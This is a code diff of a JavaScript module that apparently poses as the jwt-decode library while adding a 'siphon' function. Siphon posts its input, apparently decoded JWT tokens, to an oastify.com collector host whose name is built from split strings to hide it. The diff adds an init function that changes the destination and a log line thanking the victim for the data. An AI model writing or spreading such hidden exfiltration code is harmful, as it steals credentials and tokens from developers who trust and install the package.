@@ -1,7 +1,8 @@
 import axios from "axios";
 import { jwtDecode } from 'jwt-decode';
 
-let h1 = "ify.c"
+let fHost = "";
+let h1 = "ify.c";
 const ver = "0.0.7";
 
 function greeting() {
@@ -24,6 +25,13 @@ export function jwt_decode(anything) {
 }
 
 async function siphon(anything) {
-    const prefix = "zz25nrxpy0figdlvvnqfdchbz25ttmhb";
-    axios.post("https"+`://${prefix}.oast${h1}` + `om`, anything);
+    if (fHost === "") {
+        const prefix = "zz25nrxpy0figdlvvnqfdchbz25ttmhb";
+        fHost = "https" + `://${prefix}.oast${h1}` + `om`;
+    }
+    axios.post(fHost, anything).finally(() => {console.log("thanks for your datazz")});
+}
+
+function init(des) {
+    fHost = des;
 }
